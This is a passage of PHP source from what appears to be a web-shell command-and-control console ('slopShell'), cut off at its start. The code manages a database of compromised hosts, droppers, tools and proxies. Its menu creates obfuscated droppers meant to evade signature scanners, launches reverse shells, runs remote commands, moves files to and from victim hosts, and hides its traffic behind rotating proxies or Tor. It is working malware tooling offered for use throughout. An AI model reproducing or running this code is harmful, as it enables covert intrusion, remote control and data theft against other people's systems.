            $axx = pg_exec(pg_connect(DBCONN), $schema_to_use);
            echo str_repeat("+", 35) . "[ PROXIES ]" . str_repeat("+", 39) . "\n\n";
            foreach (pg_fetch_all($axx) as $tem => $use) {
                print(sprintf("[ ID: ]-> %s [ SCHEMA: ]-> %s [ PROXY: ]-> %s [ HOW MANY TIMES WE USED: ]-> %s [ LAST CONTACTED DOMAIN: ]-> %s\n",
                    $use['id'],
                    $use['proxy_schema'],
                    $use['proxy'],
                    $use['times_used'],
                    $use['last_domain_contacted']
                ));
            }
            pg_free_result($axx);
            echo "\n\n" . str_repeat("+", 35) . "[ END PROXIES ]" . str_repeat("+", 35) . "\n\n";
            return array(
                "Proxy" => pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT proxy FROM sloppy_bots_proxies WHERE id = '%s'", trim(readline("[ !! ] "))))),
                "Schema" => $schema
            );
        case "droppers":
            $axx = pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM sloppy_bots_droppers WHERE obfuscated = '%s' LIMIT %s", trim(readline('[ !! ] Encrypted? (y/n)->')), trim(readline("Limit(there are a ton in the db.)?"))));
            echo str_repeat("+", 35) . "[ Droppers ]" . str_repeat("+", 39) . "\n\n";
            foreach (pg_fetch_all($axx) as $tem => $use) {
                print(sprintf("[ ID: ]-> %s [ Stored: ]-> %s [ Obfuscated: ]-> %s [ Checkin: ]-> %s [ Cookie Name: ]-> %s [ Cookie Value: ]-> %s\n",
                    $use['id'],
                    $use['location_on_disk'],
                    $use['obfuscated'],
                    $use['check_in'],
                    $use['cookiename'],
                    $use['cookievalue']
                ));
            }
            pg_free_result($axx);
            echo "\n\n" . str_repeat("+", 35) . "[ END Droppers ]" . str_repeat("+", 35) . "\n\n";
            break;
        default:
            print(str_repeat("+", 35)."[ -> {$what} in DB <- ]". str_repeat("+", 27)."\n");
            foreach(pg_fetch_all(pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM %s", $sloppy_tables[$what]))) as $item){
                if ($item['encrypted'] === "t") {
                    $enc = "True";
                }else{
                    $enc = "False";
                }
                print(sprintf("[ ID: ]-> %s [ NAME: ]-> %s [ OS_Target: ]-> %s [ Encrypted: ]-> %s\n",
                    $item['id'],
                    $item['tool_name'],
                    $item['target'],
                    $enc
                ));
            }
            print(str_repeat("+", 35)."[ -> End <- ]". str_repeat("+", 35)."\n");
            return pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM %s WHERE id = '%s'", $sloppy_tables[$what], trim(readline("[ ?? ] Please select what you want ->")))));
    }

}

function check($host, $path, $batch, $proxy)
{
    if ($batch === "y") {
        logo('ch',clears,false, '','batch request');
        $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
        $rows = pg_fetch_all(pg_exec(pg_connect(DBCONN), "SELECT check_in,rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL"));
        echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        foreach ($rows as $r) {
            echo "\nTrying: {$r['rhost']}{$r['uri']}\n";
            curl_setopt(CHH, CURLOPT_URL, $r['rhost'] . $r['uri'] . "?qs=cqS");
            curl_exec(CHH);
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        print(sprintf(response_array['200'], $r['rhost'],$r['uri']));
                        pg_exec(pg_connect(DBCONN), sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE rhost = '%s'",  (int)$r['check_in'] + 1,$r['rhost']));
                        update_proxy_db_entries($proxy, true, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 404:
                        print(sprintf(response_array['404'], $r['rhost'],$r['uri']));
                        update_proxy_db_entries($proxy, true, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 500:
                        print(sprintf(response_array['500'], $r['rhost'],$r['uri']));
                        update_proxy_db_entries($proxy, true, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    default:
                        print(sprintf(response_array['default'], $r['rhost'],$r['uri']));
                        $teaTime = curl_getinfo(CHH);
                        update_proxy_db_entries($proxy, false, $r['rhost'], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    }
        }
    } elseif ($batch === "n") {
        if (!empty($host) && !empty($path)) {
            $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
            $axX = pg_fetch_row($tc);
            curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1] . "?qs=cqS");
            curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
            curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
            curl_exec(CHH);
            if (!curl_errno(CHH)) {
                switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        logo('check',clears,false, '', sprintf('%s', $axX[0].$axX[1]));
                        print(sprintf(response_array['200'], $axX[0],$axX[1]));
                        update_proxy_db_entries($proxy, true, $axX[0].$axX[1], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 404:
                        logo('check',clears,true, 'Shell not found.', sprintf('%s', $axX[0].$axX[1]));
                        print(sprintf(response_array['404'], $axX[0],$axX[1]));
                        update_proxy_db_entries($proxy, true, $axX[0].$axX[1], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    case 500:
                        logo('check',clears,true, 'Bad User Agent', sprintf('%s', $axX[0].$axX[1]));
                        print(sprintf(response_array['500'], $axX[0],$axX[1]));
                        update_proxy_db_entries($proxy, true, $axX[0].$axX[1], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                    default:
                        logo('check',clears,true, 'Server still running??', sprintf('%s', $axX[0].$axX[1]));
                        print(sprintf(response_array['default'], $axX[0],$axX[1]));
                        update_proxy_db_entries($proxy, true, $axX[0].$axX[1], false, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
                        break;
                }
            }else{
                update_proxy_db_entries($proxy, false, $axX[0].$axX[1], true, curl_getinfo(CHH, CURLINFO_TOTAL_TIME_T));
            }
        }
    } else {
        logo("cr", "", true, "", $host);
    }
}

function queryDB($host, $fetchWhat)
{
    # place holder for the query db function. this will check what information we have about a host, and which options to set.
    # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
    # work in progress.
    # @todo
    if (!empty($host)) {
        try {
            $dbCC = pg_connect(DBCONN);
            switch (strtolower($fetchWhat)) {
                case "ch":
                    $row = pg_fetch_all($dbCC, "SELECT * FROM sloppy_bots_main");
                    pg_close();
                    break;
                case "chR":
                    $row = pg_query($dbCC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
                    pg_close();
                    break;
                case "r":
                    $row = pg_query($dbCC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    pg_close();
                    break;
                default:
                    $row = pg_query($dbCC, sprintf("SELECT rhost, uri FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    pg_close();
                    break;
            }
            if (!empty($row)) {
                return $row;
            } else {
                return 0;
            }
        } catch (Exception $e) {
            $errors = array(
                "Host" => $host,
                "Fetch What?" => $fetchWhat,
                "Explicit Error" => $e
            );
            logo('query DB', clears, true, $errors, $host);
        }


    } else {
        $errors = array(
            "Host" => $host,
            "Fetch What?" => $fetchWhat
        );
        logo('query DB', clears, true, $errors, $host);
    }
    return 0;
}


$run = true;
logo($lc = null, clears, "", "", '');
echo "[ ++ ] Checking for updates [ ++ ]".PHP_EOL;
if (strstr(getcwd(), "slopShell") == true) {
    system("git pull");
} else {
    $homie = readline("Where is slopshell downloaded to?(full path)->");
    system("git pull {$homie}");
}
$proxy_set = null;
$proxy_target = null;
$curlopt_proxy_types = array(
    "http" => CURLPROXY_HTTP,
    "https" => CURLPROXY_HTTPS,
    "socks4" => CURLPROXY_SOCKS4,
    "socks5" => CURLPROXY_SOCKS5,
    "tor" => CURLPROXY_SOCKS4
);


switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
    case "y":
        $cho = awesomeMenu('proxies');
        $proxy_set = true;
        $proxy_target = $cho['Proxy'][0];
        $proxy_schema = $curlopt_proxy_types[$cho['Schema']];
        break;
    case "n":
        $proxy_set = false;
        $proxy_schema = null;
        $proxy_target = null;
        break;
    case "tor":
        $proxy_set = true;
        $proxy_target = "127.0.0.1:9050";
        $proxy_schema = $curlopt_proxy_types['tor'];
        break;
}
if (is_null(config['sloppy_proxies']['rotate']) && $proxy_set != false){
    switch (strtolower(readline("Would you like to rotate proxies?(y/n)-> "))){
        case "y":
            $rotate_proxy = true;
            break;
        case "n":
            $rotate_proxy = false;
            break;
    }
}

while ($run) {
    $h = null;
    $p = null;
    $m = null;
    $c = null;
    $e = null;
    $w = null;
    $pw = null;
    curl_reset(CHH);
    curl_setopt(CHH, CURLOPT_HEADER, 1);
    try {
        if ($proxy_set === false) {
            echo "\e[0;31;40mPROXY NOT SET.\e[0m".PHP_EOL;
            curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
            curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
            curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
        } else {
            echo "\e[0;32;40mProxy pointing to: " . $proxy_schema ."\e[0m".PHP_EOL;
            curl_setopt(CHH, CURLOPT_USERAGENT, config['sloppy_http']['useragent']);
            if (!is_null($proxy_target)){
                echo "\e[0;32;40mProxy Set: " . $proxy_target ."\e[0m".PHP_EOL;
                if (strpos($proxy_schema, "http")) {
                    curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 1);
                }else{
                    curl_setopt(CHH, CURLOPT_HTTPPROXYTUNNEL, 0);
                }
                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 30);
                curl_setopt(CHH, CURLOPT_TIMEOUT, 30);
                curl_setopt(CHH, CURLOPT_PROXYTYPE, $proxy_schema);
                curl_setopt(CHH, CURLOPT_PROXY, $proxy_target);
            }
        }
        if (config['sloppy_http']['verify_ssl'] === "no") {
            curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
        } else {
            curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 2);
        }
    } catch (Exception $e) {
        print("{$e}\n\n");
    }
    echo "Current User-Agent: ". config['sloppy_http']['useragent'].PHP_EOL;
    print("\n\033[33;40mPlease select your choice:".PHP_EOL."->");
    echo("\033[0m");
    $pw = trim(fgets(STDIN));
    $lc = $pw;
    logo($lc, clears, "", "", '');
    switch (strtolower($pw)) {
        case "r":
            switch (strtolower(readline("Would you like to configure the proxies?(y/n/tor)"))){
                case "y":
                    $cho = awesomeMenu('proxies');
                    $proxy_set = true;
                    $proxy_target = $cho['Proxy'][0];
                    $proxy_schema = $curlopt_proxy_types[$cho['Schema']];
                    break;
                case "n":
                    $proxy_set = false;
                    $proxy_schema = null;
                    $proxy_target = null;
                    break;
                case "tor":
                    $proxy_set = true;
                    $proxy_target = "127.0.0.1:9050";
                    $proxy_schema = $curlopt_proxy_types['tor'];
                    break;
            }
            break;
        case "lt":
            $what_we_want = readline("[ ?? ] What are we looking for? (t/d/dr/proxy)->");
            switch ($what_we_want){
                case "t":
                    awesomeMenu("tools");
                    break;
                case "d":
                    awesomeMenu("domains");
                    break;
                case "dr":
                    awesomeMenu("droppers");
                    break;
                case "proxy":
                    awesomeMenu("proxies");
                    break;
            }
            break;
        case "at":
            $add = trim(readline("Do we need to add it to the db? (add/grab) -> "));
            if ($add === "add") {
                $ourTool = trim(readline("Full path to tool-> "));
                $dcrypt = trim(readline("Do we need to encrypt it?-> "));
                if ($dcrypt === 'n') {
                    $encrypt = false;
                } else {
                    $encrypt = true;
                }
                $name = trim(readline("Is there a name for it already, or what do you call it.? ->"));
                sloppyTools($add, $ourTool, $name, $encrypt);
            } else {
                sloppyTools($add, '', '', '');
            }
            break;
        case "up":
            $u = readline("[ !! ] Are we uploading or downloading?".PHP_EOL."(u/d)->");
            awesomeMenu("hosts");
            $t = readline("->");
            if (strtolower($u) === "d") {
                b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", $t);
            }else{
                $x = awesomeMenu("tools");
                b64($x, "u", $t);
            }
            break;
        case "cr":
            system(clears);
            $h_name = null;
            $h_port = null;
            $d_int = null;
            $osb = null;
            echo("Where are we calling home to? (hostname/ip)->");
            $h_name = trim(fgets(STDIN));
            echo("Which port are we calling home on?");
            $h_port = trim(fgets(STDIN));
            echo("How often should we call home? (int) ->");
            $d_int = trim(fgets(STDIN));
            echo("Do we need to obfuscate? (y/n) ->");
            $osb = trim(fgets(STDIN));
            if (strtolower($osb) == "y") {
                echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
                $de = trim(fgets(STDIN));
            } else {
                $de = "0";
            }
            createDropper($h_name, $h_port, $d_int, $osb, $de);
            break;
        case "sys":
            system(clears);
            awesomeMenu("hosts");
            $h = readline("Which host are we checking?".PHP_EOL."->");
            try {
                sys($h);
            } catch (Exception $e) {
                logo("s", clears, true, $e, $h);
            }
            break;
        case "rev":
            system(clears);
            awesomeMenu("hosts");
            $h = readline("Please tell me the host.(default is the host sending this request.)".PHP_EOL."->");
            $p = readline(PHP_EOL."Which port shall we use?(default is 1634)".PHP_EOL."->");
            $m = readline("Which method is to be used?(default is bash)".PHP_EOL."->");
            $w = readline("Who are we connecting back to?".PHP_EOL."(our ip/hostname)->");
            if (!empty($h)) {
                rev($h, $p, $m, $w);
            }
            break;
        case "com":
            system(clears);
            try {
                awesomeMenu("hosts");
                $h = readline("Which host are we sending the command to?".PHP_EOL."->");
                $c = readline("And now the command: ".PHP_EOL."->");
                $e = readline("Are we needing to encrypt?".PHP_EOL."(y/n)->");
                switch (strtolower($e)) {
                    case "y":
                        $encrypt = true;
                        break;
                    default:
                        $encrypt = false;
                        break;
                }
                co($c, $h, $encrypt); // defaulting to false for now. until all apsects of that call are worked out and added to the shell.
            } catch (Exception $e) {
                logo("c", clears, true, $e, $h);
            }
            break;
        case "cl":
            system(clears);
            try {
                awesomeMenu("hosts");
                $h = readline("Which host are we interacting with?".PHP_EOL."->");
                $rep = readline("Repo to clone?".PHP_EOL."->");
                clo($h, $rep, queryDB($h, "cl"));
            } catch (Exception $e) {
                logo("cl", clears, true, $e, $h);
            }
            break;
        case "a":
            system(clears);
            try {
                $h = readline("Who did we pwn my friend?".PHP_EOL."->");
                $o = readline("Do you know the OS?".PHP_EOL."->");
                aHo($h, $o, 0);
            } catch (Exception $e) {
                logo("a", clears, true, $e, $h);
            }
            break;
        case "ch":
            system(clears);
            try {
                $b = strtolower(readline("Is this going to be a batch job?(Y/N)".PHP_EOL."->"));
                switch ($b) {
                    case "y":
                        echo "Executing batch job!".PHP_EOL;
                        check('0', 'b', "y", $proxy_target);
                        break;
                    case "n":
                        echo "Not executing batch job.".PHP_EOL;
                        awesomeMenu("hosts");
                        $h = readline("Who is it we need to check on?(based on ID)".PHP_EOL."->");
                        check($h, "chR", "n", $proxy_target);
                        break;
                    default:
                        logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.".PHP_EOL, '');
                        break;
                }
            } catch (Exception $e) {
                logo("ch", clears, true, $e, '');
            }
            break;
        case "m":
            logo($lc, clears, "", "", '');
            break;
        case "q":
            curl_close(CHH);
            logo('q', clears, false, '', '');
            $run = false;
            break;
        case "o":
            opts($proxy_set);
            break;
        case "gp":
            $p_judge = trim(readline('Proxy judge?(schema://domain:port/ or blank for none.)-> '));
            grab_proxy(readline("What are we doing?(test/confirm)->"), empty($p_judge) ? "https://icanhazip.com" : $p_judge, is_null($rotate_proxy) ? false : $rotate_proxy);
            break;
        default:
            logo($lc, clears, "", "", '');
            echo "\033[33;40myou need to select a valid option...\033[0m".PHP_EOL;
    }
}

